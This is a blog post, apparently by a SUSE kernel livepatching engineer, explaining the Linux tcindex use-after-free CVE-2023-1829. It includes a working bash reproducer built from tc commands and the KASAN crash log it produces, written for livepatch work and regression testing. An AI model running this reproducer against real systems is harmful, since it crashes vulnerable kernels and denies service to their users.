<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Five commands to crash the kernel | Marcos&#39; Blog</title>
<meta name="keywords" content="">
<meta name="description" content="A tcindex tale">
<meta name="author" content="">
<link rel="canonical" href="https://mpdesouza.com/blog/five-commands-to-crash-the-kernel/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.296fec78fff86e20531f33f7a3ad2a4f7e921f7482195143705d1691db50922b.css" integrity="sha256-KW/seP/4biBTHzP3o60qT36SH3SCGVFDcF0WkdtQkis=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://mpdesouza.com/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://mpdesouza.com/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://mpdesouza.com/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://mpdesouza.com/apple-touch-icon.png">
<link rel="mask-icon" href="https://mpdesouza.com/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-LWD0KKCW2G"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-LWD0KKCW2G', { 'anonymize_ip': false });
}
</script>
<meta property="og:title" content="Five commands to crash the kernel" />
<meta property="og:description" content="A tcindex tale" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://mpdesouza.com/blog/five-commands-to-crash-the-kernel/" />
<meta property="og:image" content="https://mpdesouza.com/images/boom.png" /><meta property="article:section" content="blog" />
<meta property="article:published_time" content="2023-08-22T21:18:21-03:00" />
<meta property="article:modified_time" content="2023-08-22T21:18:21-03:00" />

<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://mpdesouza.com/images/boom.png" />
<meta name="twitter:title" content="Five commands to crash the kernel"/>
<meta name="twitter:description" content="A tcindex tale"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Blog",
      "item": "https://mpdesouza.com/blog/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Five commands to crash the kernel",
      "item": "https://mpdesouza.com/blog/five-commands-to-crash-the-kernel/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Five commands to crash the kernel",
  "name": "Five commands to crash the kernel",
  "description": "A tcindex tale",
  "keywords": [
    
  ],
  "articleBody": "Introduction Working on the SUSE Kernel Livepatching Team means dealing with lots of CVEs, and the majority of them are related to kernel network subsystem.\nCVE-2023-1829 was discovered recently and is one CVE that I found interesting. The problem is a Use-After-Free flaw in one of the oldest traffic control classifiers in the Linux kernel. StarLabs did great coverage of this CVE, explaining core concepts such as netlink, tc, qdisc, classifiers and examining and exploiting this CVE.\nIn this article, Iâ€™m going to cover how to trigger the problem using only the tc tool.\nMost CVEs contain details and even exploits for the security problems described, but they are not so easy to digest and often it can be hard to understand the nature of the problem. While these reports are comprehensive, sometimes it can be hard to understand how to trigger the problem and exploit a CVE. Understanding the problem and the mechanisms to trigger it is a crucial part of our livepatch creation process at SUSE.\nFirst letâ€™s try to understand the problem introduced by CVE-2023-1829 by reading its description:\nA use-after-free vulnerability in the Linux Kernel traffic control index filter (tcindex) can be exploited to achieve local privilege escalation.ï¿½The tcindex_delete function which does not properly deactivate filters in case of a perfect hashes while deleting the underlying structure which can later lead to double freeing the structure.ï¿½A local attacker user can use this vulnerability to elevate its privileges to root. We recommend upgrading past commit 8c710f75256bb3cf05ac7b1672c82b92c43f3d28. Now letâ€™s check what commit 8c710f75256bb3cf05ac7b1672c82b92c43f3d28 does:\nnet/sched: Retire tcindex classifier The tcindex classifier has served us well for about a quarter of a century but has not been getting much TLC due to lack of known users. Most recently it has become easy prey to syzkaller. For this reason, we are retiring it. As you can see, the affected code was removed from the kernel. Problem solved. That is one easy way to fix a CVE.\nPerfect hashes The CVE description mentions perfect hashes, but what exactly is it? Letâ€™s look into the code a bit:\n1 2 3 4 5 static inline int valid_perfect_hash(struct tcindex_data *p) { return p-\u003ehash \u003e (p-\u003emask \u003e\u003e p-\u003eshift); } As you can see, the tcindex code has a function that checks if the created filter can use perfect hashes. This function is called from tcindex_set_parms, where it validates the hash, mask, and shift values. If not informed, p-\u003ehash default value is 64 (DEFAULT_HASH_SIZE). The value of shift and mask are obtained when adding the tcindex filter, and the shift upper limit is 16. With this information we can force the use of perfect hashes by creating a filter using 10 as shift value, and 65635 (0xFFFF) for mask:\n1 p-\u003ehash(64) \u003e p-\u003emask(0xFFFF) \u003e\u003e p-\u003eshift(10); // (the shift operation results in 63) Using the rationale above, we can create a reproducer script to trigger the crash in a vulnerable system:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 #!/bin/bash set -ex for i in {1..300}; do tc qdisc add dev lo root handle 1:0 htb default 30 tc class add dev lo parent 1: classid 1:1 htb rate 256kbit # Create a tcindex filter setting shift and mask to certain values to # make tcindex use the perfect hash tc filter add dev lo parent 1: protocol ip prio 1 \\ handle 10 tcindex mask 0xFFFF shift 10 classid 1:1 action drop # delete the filter to trigger the UAF on tcindex_delete tc filter delete dev lo parent 1: prio 1 handle 10 protocol ip tcindex tc qdisc delete dev lo root handle 1:0 htb done The tcindex filter created and deleted above is using perfect hashes. The loop is there to trigger the UAF as soon as possible to bring the system down.\nNow letâ€™s see what happens if we run the script above in a vulnerable kernel with KASAN enabled:\nbash rep.sh + for i in {1..300} + tc qdisc add dev lo root handle 1:0 htb default 30 + tc class add dev lo parent 1: classid 1:1 htb rate 256kbit + tc filter add dev lo parent 1: protocol ip prio 1 handle 10 tcindex mask 0xFFFF shift 10 classid 1:1 action drop [ 7.066915] GACT probability NOT on [ 7.073193] tc (113) used greatest stack depth: 24352 bytes left + tc filter delete dev lo parent 1: prio 1 handle 10 protocol ip tcindex + tc qdisc delete dev lo root handle 1:0 htb + for i in {1..300} + tc qdisc add dev lo root handle 1:0 htb default 30 [ 7.141508] ================================================================== [ 7.142150] BUG: KASAN: use-after-free in tcf_action_destroy+0x66/0xd0 [ 7.142414] Read of size 8 at addr ffff8881140aba00 by task kworker/u8:0/9 [ 7.142671] [ 7.142732] CPU: 0 PID: 9 Comm: kworker/u8:0 Not tainted 6.2.0 #2 [ 7.142956] Hardware name: Bochs Bochs, BIOS Bochs 01/01/2011 [ 7.143213] Workqueue: tc_filter_workqueue tcindex_destroy_rexts_work [cls_tcindex] [ 7.143926] Call Trace: [ 7.144059] [ 7.144162] dump_stack_lvl+0x48/0x5f [ 7.144335] print_report+0x184/0x4b1 [ 7.144510] ? __virt_addr_valid+0xdd/0x160 [ 7.144683] kasan_report+0xdd/0x120 [ 7.144850] ? tcf_action_destroy+0x66/0xd0 [ 7.145065] ? tcf_action_destroy+0x66/0xd0 [ 7.145301] tcf_action_destroy+0x66/0xd0 [ 7.145515] tcf_exts_destroy+0x2d/0x60 [ 7.145710] __tcindex_destroy_rexts+0x11/0xf0 [cls_tcindex] [ 7.145991] tcindex_destroy_rexts_work+0x1b/0x30 [cls_tcindex] [ 7.146297] process_one_work+0x57a/0xa40 [ 7.146512] ? __pfx_process_one_work+0x10/0x10 [ 7.146737] ? __pfx_do_raw_spin_lock+0x10/0x10 [ 7.146971] worker_thread+0x93/0x700 [ 7.147158] ? __pfx_worker_thread+0x10/0x10 [ 7.147369] kthread+0x159/0x190 [ 7.147534] ? __pfx_kthread+0x10/0x10 [ 7.147725] ret_from_fork+0x29/0x50 [ 7.147909] [ 7.148027] [ 7.148111] Allocated by task 113: [ 7.148288] kasan_save_stack+0x33/0x60 [ 7.148486] kasan_set_track+0x25/0x30 [ 7.148683] __kasan_kmalloc+0x92/0xa0 [ 7.148881] tcindex_set_parms+0x150/0x11c0 [cls_tcindex] [ 7.149174] tcindex_change+0x15b/0x21f [cls_tcindex] [ 7.149442] tc_new_tfilter+0x6f4/0x11b0 [ 7.149654] rtnetlink_rcv_msg+0x535/0x6b0 [ 7.149862] netlink_rcv_skb+0xdc/0x210 [ 7.150060] netlink_unicast+0x2d0/0x460 [ 7.150262] netlink_sendmsg+0x39b/0x690 [ 7.150482] ____sys_sendmsg+0x404/0x430 [ 7.150716] ___sys_sendmsg+0xfd/0x170 [ 7.151025] __sys_sendmsg+0xee/0x180 [ 7.151259] do_syscall_64+0x3c/0x90 [ 7.151453] entry_SYSCALL_64_after_hwframe+0x72/0xdc As expected, things went bad. As you can see, five commands can crash your kernel, if tcindex is enabled. The reproducer above was a good candidate to be included in the Linux Testing Project (LTP), so I asked my SUSE colleague Martin Doucha to do it, and he did: Add test for CVE 2023-1829. The submitted code uses the LTP API to create the filter, instead of relying on the tc tool. Thanks a lot Martin!\nConclusion Learning about APIs and kernel features that you never heard of is a fascinating part of creating kernel livepatches. This was the case for me when I looked into (now defunct) tcindex code and itâ€™s even better when your reproducer is merged into LTP.\nThatâ€™s all for today, thanks a lot for reading. See you in the next post!\nReferences Breaking the Code - Exploiting and Examining CVE-2023-1829 in cls_tcindex Classifier Vulnerability CVE-2023-1829 Linux Advanced Routing and Traffic Control (LARC) Mecanismos de QoS em Linux (in Portuguese) ",
  "wordCount" : "1113",
  "inLanguage": "en",
  "image":"https://mpdesouza.com/images/boom.png","datePublished": "2023-08-22T21:18:21-03:00",
  "dateModified": "2023-08-22T21:18:21-03:00",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://mpdesouza.com/blog/five-commands-to-crash-the-kernel/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Marcos' Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "https://mpdesouza.com/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://mpdesouza.com" accesskey="h" title="Marcos&#39; Blog (Alt + H)">Marcos&#39; Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://mpdesouza.com/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="https://mpdesouza.com/about-me/" title="About Me">
                    <span>About Me</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://mpdesouza.com">Home</a>&nbsp;Â»&nbsp;<a href="https://mpdesouza.com/blog/">Blog</a></div>
    <h1 class="post-title entry-hint-parent">
      Five commands to crash the kernel
    </h1>
    <div class="post-meta"><span title='2023-08-22 21:18:21 -0300 -0300'>August 22, 2023</span>

</div>
  </header> 
<figure class="entry-cover"><img loading="eager" src="https://mpdesouza.com/images/boom.png" alt="">
        
</figure>
  <div class="post-content"><h2 id="introduction">Introduction<a hidden class="anchor" aria-hidden="true" href="#introduction">#</a></h2>
<p>Working on the <a href="https://suse.com/">SUSE</a> <a href="https://www.suse.com/products/live-patching/">Kernel
Livepatching</a> Team means dealing
with lots of CVEs, and the majority of them are related to kernel network
subsystem.</p>
<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-1829">CVE-2023-1829</a> was discovered
recently and is one CVE that I found interesting. The problem is a
Use-After-Free flaw in one of the oldest traffic control classifiers in the
Linux kernel.
<a href="https://starlabs.sg/blog/2023/06-breaking-the-code-exploiting-and-examining-cve-2023-1829-in-cls_tcindex-classifier-vulnerability/#vulnerability-analysis">StarLabs</a>
did great coverage of this CVE, explaining core concepts such as netlink, tc,
qdisc, classifiers and examining and exploiting this CVE.</p>
<p>In this article, I&rsquo;m going to cover how to trigger the problem using only the
<a href="https://man7.org/linux/man-pages/man8/tc.8.html">tc</a> tool.</p>
<p>Most CVEs contain details and even exploits for the security problems described,
but they are not so easy to digest and often it can be hard to understand the
nature of the problem. While these reports are comprehensive, sometimes it can
be hard to understand how to trigger the problem and exploit a CVE.
Understanding the problem and the mechanisms to trigger it is a crucial part of
our livepatch creation process at SUSE.</p>
<p>First let&rsquo;s try to understand the problem introduced by CVE-2023-1829 by
reading its <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-1829">description</a>:</p>
<pre tabindex="0"><code>A use-after-free vulnerability in the Linux Kernel traffic control index filter
(tcindex) can be exploited to achieve local privilege escalation. The
tcindex_delete function which does not properly deactivate filters in case of a
perfect hashes while deleting the underlying structure which can later lead to
double freeing the structure. A local attacker user can use this vulnerability
to elevate its privileges to root. We recommend upgrading past commit
8c710f75256bb3cf05ac7b1672c82b92c43f3d28.
</code></pre><p>Now let&rsquo;s check what <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=8c710f75256bb3cf05ac7b1672c82b92c43f3d28">commit
8c710f75256bb3cf05ac7b1672c82b92c43f3d28</a>
does:</p>
<pre tabindex="0"><code>net/sched: Retire tcindex classifier

The tcindex classifier has served us well for about a quarter of a century
but has not been getting much TLC due to lack of known users. Most recently
it has become easy prey to syzkaller. For this reason, we are retiring it.
</code></pre><p>As you can see, the affected code was removed from the kernel. Problem solved. That is one easy way to fix a CVE.</p>
<h2 id="perfect-hashes">Perfect hashes<a hidden class="anchor" aria-hidden="true" href="#perfect-hashes">#</a></h2>
<p>The CVE description mentions perfect hashes, but what exactly is it? Let&rsquo;s look into the code a bit:</p>
<div class="highlight"><div style="color:#f5a97f;background-color:#24273a;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f5a97f;background-color:#24273a;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7a543f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7a543f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7a543f">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7a543f">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7a543f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f5a97f;background-color:#24273a;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#c6a0f6">static</span> <span style="color:#c6a0f6">inline</span> <span style="color:#eed49f">int</span>
</span></span><span style="display:flex;"><span><span style="color:#91d7e3">valid_perfect_hash</span><span style="color:#cad3f5">(</span><span style="color:#c6a0f6">struct</span> <span style="color:#b7bdf8">tcindex_data</span> <span style="color:#91d7e3">*</span><span style="color:#b7bdf8">p</span><span style="color:#cad3f5">)</span>
</span></span><span style="display:flex;"><span><span style="color:#cad3f5">{</span>
</span></span><span style="display:flex;"><span>	<span style="color:#c6a0f6">return</span> <span style="color:#b7bdf8">p</span><span style="color:#91d7e3">-&gt;</span><span style="color:#b7bdf8">hash</span> <span style="color:#91d7e3">&gt;</span> <span style="color:#cad3f5">(</span><span style="color:#b7bdf8">p</span><span style="color:#91d7e3">-&gt;</span><span style="color:#b7bdf8">mask</span> <span style="color:#91d7e3">&gt;&gt;</span> <span style="color:#b7bdf8">p</span><span style="color:#91d7e3">-&gt;</span><span style="color:#b7bdf8">shift</span><span style="color:#cad3f5">);</span>
</span></span><span style="display:flex;"><span><span style="color:#cad3f5">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>As you can see, the tcindex code has a function that checks if the created
filter can use perfect hashes. This function is called from
<strong>tcindex_set_parms</strong>, where it validates the <em>hash</em>, <em>mask</em>, and <em>shift</em>
values. If not informed, <em>p-&gt;hash</em> default value is 64 (<strong>DEFAULT_HASH_SIZE</strong>).
The value of <em>shift</em> and <em>mask</em> are obtained when adding the tcindex filter, and
the <em>shift</em> <a href="https://elixir.bootlin.com/linux/v6.0.19/source/net/sched/cls_tcindex.c#L374">upper limit is
16</a>.
With this information we can force the use of perfect hashes by creating a
filter using 10 as <em>shift</em> value, and 65635 (0xFFFF) for <em>mask</em>:</p>
<div class="highlight"><div style="color:#f5a97f;background-color:#24273a;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f5a97f;background-color:#24273a;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7a543f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f5a97f;background-color:#24273a;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#b7bdf8">p</span><span style="color:#91d7e3">-&gt;</span><span style="color:#91d7e3">hash</span><span style="color:#cad3f5">(</span>64<span style="color:#cad3f5">)</span> <span style="color:#91d7e3">&gt;</span> <span style="color:#b7bdf8">p</span><span style="color:#91d7e3">-&gt;</span><span style="color:#91d7e3">mask</span><span style="color:#cad3f5">(</span>0xFFFF<span style="color:#cad3f5">)</span> <span style="color:#91d7e3">&gt;&gt;</span> <span style="color:#b7bdf8">p</span><span style="color:#91d7e3">-&gt;</span><span style="color:#91d7e3">shift</span><span style="color:#cad3f5">(</span>10<span style="color:#cad3f5">);</span> <span style="color:#5b6078;font-style:italic">// (the shift operation results in 63)
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Using the rationale above, we can create a reproducer script to trigger the crash in a vulnerable system:</p>
<div class="highlight"><div style="color:#f5a97f;background-color:#24273a;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f5a97f;background-color:#24273a;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7a543f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7a543f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7a543f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7a543f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7a543f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7a543f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7a543f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7a543f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7a543f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7a543f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7a543f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7a543f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7a543f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7a543f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7a543f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7a543f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7a543f">17
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f5a97f;background-color:#24273a;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#8aadf4;font-style:italic">#!/bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#8aadf4;font-style:italic"></span>
</span></span><span style="display:flex;"><span><span style="font-style:italic">set</span> -ex
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c6a0f6">for</span> i in <span style="color:#91d7e3">{</span>1..300<span style="color:#91d7e3">}</span><span style="color:#cad3f5">;</span> <span style="color:#c6a0f6">do</span>
</span></span><span style="display:flex;"><span>	tc qdisc add dev lo root handle 1:0 htb default 30
</span></span><span style="display:flex;"><span>	tc class add dev lo parent 1: classid 1:1 htb rate 256kbit
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#5b6078;font-style:italic"># Create a tcindex filter setting shift and mask to certain values to</span>
</span></span><span style="display:flex;"><span>	<span style="color:#5b6078;font-style:italic"># make tcindex use the perfect hash</span>
</span></span><span style="display:flex;"><span>	tc filter add dev lo parent 1: protocol ip prio 1  <span style="color:#8aadf4">\
</span></span></span><span style="display:flex;"><span><span style="color:#8aadf4"></span>		handle 10 tcindex mask 0xFFFF <span style="font-style:italic">shift</span> 10 classid 1:1 action drop
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#5b6078;font-style:italic"># delete the filter to trigger the UAF on tcindex_delete</span>
</span></span><span style="display:flex;"><span>	tc filter delete dev lo parent 1: prio 1 handle 10 protocol ip tcindex
</span></span><span style="display:flex;"><span>	tc qdisc delete dev lo root handle 1:0 htb
</span></span><span style="display:flex;"><span><span style="color:#c6a0f6">done</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The tcindex filter created and deleted above is using perfect hashes. The loop
is there to trigger the UAF as soon as possible to bring the system down.</p>
<p>Now let&rsquo;s see what happens if we run the script above in a vulnerable kernel
with KASAN enabled:</p>
<pre tabindex="0"><code>bash rep.sh
+ for i in {1..300}
+ tc qdisc add dev lo root handle 1:0 htb default 30
+ tc class add dev lo parent 1: classid 1:1 htb rate 256kbit
+ tc filter add dev lo parent 1: protocol ip prio 1 handle 10 tcindex mask 0xFFFF shift 10 classid 1:1 action drop
[    7.066915] GACT probability NOT on
[    7.073193] tc (113) used greatest stack depth: 24352 bytes left
+ tc filter delete dev lo parent 1: prio 1 handle 10 protocol ip tcindex
+ tc qdisc delete dev lo root handle 1:0 htb                                                                                                            + for i in {1..300}                                                         
+ tc qdisc add dev lo root handle 1:0 htb default 30
[    7.141508] ==================================================================
[    7.142150] BUG: KASAN: use-after-free in tcf_action_destroy+0x66/0xd0
[    7.142414] Read of size 8 at addr ffff8881140aba00 by task kworker/u8:0/9
[    7.142671]
[    7.142732] CPU: 0 PID: 9 Comm: kworker/u8:0 Not tainted 6.2.0 #2
[    7.142956] Hardware name: Bochs Bochs, BIOS Bochs 01/01/2011
[    7.143213] Workqueue: tc_filter_workqueue tcindex_destroy_rexts_work [cls_tcindex]
[    7.143926] Call Trace:
[    7.144059]  &lt;TASK&gt;
[    7.144162]  dump_stack_lvl+0x48/0x5f
[    7.144335]  print_report+0x184/0x4b1
[    7.144510]  ? __virt_addr_valid+0xdd/0x160
[    7.144683]  kasan_report+0xdd/0x120
[    7.144850]  ? tcf_action_destroy+0x66/0xd0
[    7.145065]  ? tcf_action_destroy+0x66/0xd0
[    7.145301]  tcf_action_destroy+0x66/0xd0
[    7.145515]  tcf_exts_destroy+0x2d/0x60
[    7.145710]  __tcindex_destroy_rexts+0x11/0xf0 [cls_tcindex]
[    7.145991]  tcindex_destroy_rexts_work+0x1b/0x30 [cls_tcindex]
[    7.146297]  process_one_work+0x57a/0xa40
[    7.146512]  ? __pfx_process_one_work+0x10/0x10
[    7.146737]  ? __pfx_do_raw_spin_lock+0x10/0x10
[    7.146971]  worker_thread+0x93/0x700
[    7.147158]  ? __pfx_worker_thread+0x10/0x10
[    7.147369]  kthread+0x159/0x190
[    7.147534]  ? __pfx_kthread+0x10/0x10
[    7.147725]  ret_from_fork+0x29/0x50
[    7.147909]  &lt;/TASK&gt;
[    7.148027]
[    7.148111] Allocated by task 113:
[    7.148288]  kasan_save_stack+0x33/0x60
[    7.148486]  kasan_set_track+0x25/0x30
[    7.148683]  __kasan_kmalloc+0x92/0xa0
[    7.148881]  tcindex_set_parms+0x150/0x11c0 [cls_tcindex]
[    7.149174]  tcindex_change+0x15b/0x21f [cls_tcindex]
[    7.149442]  tc_new_tfilter+0x6f4/0x11b0
[    7.149654]  rtnetlink_rcv_msg+0x535/0x6b0
[    7.149862]  netlink_rcv_skb+0xdc/0x210
[    7.150060]  netlink_unicast+0x2d0/0x460
[    7.150262]  netlink_sendmsg+0x39b/0x690
[    7.150482]  ____sys_sendmsg+0x404/0x430
[    7.150716]  ___sys_sendmsg+0xfd/0x170
[    7.151025]  __sys_sendmsg+0xee/0x180
[    7.151259]  do_syscall_64+0x3c/0x90
[    7.151453]  entry_SYSCALL_64_after_hwframe+0x72/0xdc
</code></pre><p>As expected, things went bad. As you can see, <strong>five commands can crash your
kernel</strong>, if tcindex is enabled. The reproducer above was a good candidate to be
included in the <a href="https://linux-test-project.github.io/">Linux Testing Project
(LTP)</a>, so I asked my SUSE colleague
Martin Doucha to do it, and he did: <a href="https://github.com/linux-test-project/ltp/commit/4bbd85ac3bbc77384352f4b66e59b1bb05fbc29e">Add test for CVE
2023-1829</a>.
The submitted code uses the LTP API to create the filter, instead of relying on
the tc tool. Thanks a lot Martin!</p>
<h2 id="conclusion">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h2>
<p>Learning about APIs and kernel features that you never heard of is a fascinating
part of creating kernel livepatches. This was the case for me when I looked into
(now defunct) tcindex code and it&rsquo;s even better when your reproducer is merged
into LTP.</p>
<p>That&rsquo;s all for today, thanks a lot for reading. See you in the next post!</p>
<h2 id="references">References<a hidden class="anchor" aria-hidden="true" href="#references">#</a></h2>
<ul>
<li><a href="https://starlabs.sg/blog/2023/06-breaking-the-code-exploiting-and-examining-cve-2023-1829-in-cls_tcindex-classifier-vulnerability/#vulnerability-analysis">Breaking the Code - Exploiting and Examining CVE-2023-1829 in cls_tcindex Classifier Vulnerability</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-1829">CVE-2023-1829</a></li>
<li><a href="https://tldp.org/HOWTO/Adv-Routing-HOWTO/">Linux Advanced Routing and Traffic Control (LARC)</a></li>
<li><a href="https://wiki.sj.ifsc.edu.br/images/0/0d/QoSLinux.pdf">Mecanismos de QoS em Linux (in Portuguese)</a></li>
</ul>


